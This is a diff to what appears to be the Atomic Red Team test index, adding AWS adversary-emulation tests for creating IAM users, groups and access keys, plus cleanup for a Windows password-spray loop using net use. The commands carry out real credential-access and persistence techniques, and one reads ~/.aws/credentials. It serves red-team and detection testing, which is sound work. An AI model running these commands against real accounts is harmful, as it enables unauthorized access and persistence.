@@ -4369,6 +4369,9 @@ credential-access:
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+        cleanup_command: |-
+          del #{input_file_users}
+          del #{input_file_passwords}
     - name: Brute Force Credentials of single domain user via LDAP against domain
         controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
@@ -36754,6 +36757,39 @@ persistence:
 
 '
         name: powershell
+    - name: AWS - Create a group and add a user to that group
+      auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f110a31122
+      description: 'Adversaries create AWS group, add users to specific to that group
+        to elevate their privilieges to gain more accesss
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Name of the AWS group to create
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if the user exists, we can only add a user to a group
+          if the user exists.
+
+'
+        prereq_command: 'aws iam list-users | grep #{username}
+
+'
+        get_prereq_command: 'echo Please run atomic test T1136.003, before running
+          this atomic test
+
+'
+      executor:
+        command: |
+          aws iam create-group --group-name #{username}
+          aws iam add-user-to-group --user-name #{username} --group-name #{username}
+        cleanup_command: |
+          aws iam remove-user-from-group --user-name #{username} --group-name #{username}
+          aws iam delete-group --group-name #{username}
+        name: sh
   T1547.014:
     technique:
       external_references:
@@ -37007,7 +37043,42 @@ persistence:
       x_mitre_platforms:
       - IaaS
       - Azure AD
-    atomic_tests: []
+      identifier: T1098.001
+    atomic_tests:
+    - name: AWS - Create Access Key and Secret Key
+      auto_generated_guid: 8822c3b0-d9f9-4daf-a043-491160a31122
+      description: 'Adversaries create their own new access and secret keys to programatically
+        interact with AWS environment, which is already compromised
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Create new AWS access and secret keys for the user
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if the user exists.
+
+'
+        prereq_command: 'aws iam list-users | grep #{username}
+
+'
+        get_prereq_command: 'echo Please run atomic test T1136.003, before running
+          this atomic
+
+'
+      executor:
+        command: |
+          aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+          cd $PathToAtomicsFolder/T1098.001/bin/
+          ./aws_secret.sh
+        cleanup_command: |
+          access_key=`cat $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`
+          aws iam delete-access-key --access-key-id $access_key --user-name #{username}
+          rm $PathToAtomicsFolder/T1098.001/bin/aws_secret.creds
+        name: sh
   T1546.009:
     technique:
       external_references:
@@ -38578,7 +38649,43 @@ persistence:
       - Office 365
       - IaaS
       - Google Workspace
-    atomic_tests: []
+      identifier: T1136.003
+    atomic_tests:
+    - name: AWS - Create a new IAM user
+      auto_generated_guid: 8d1c2368-b503-40c9-9057-8e42f21c58ad
+      description: 'Creates a new IAM user in AWS. Upon successful creation, a new
+        user will be created. Adversaries create new IAM users so that their malicious
+        activity do not interupt the normal functions of the compromised users and
+        can remain undetected for a long time
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        username:
+          description: Username of the IAM user to create in AWS
+          type: String
+          default: atomicredteam
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: 'cat ~/.aws/credentials | grep "default"
+
+'
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: 'aws iam create-user --user-name #{username}
+
+'
+        cleanup_command: 'aws iam delete-user --user-name #{username}
+
+'
+        name: sh
+        elevation_required: false
   T1078.004:
     technique:
       id: attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65
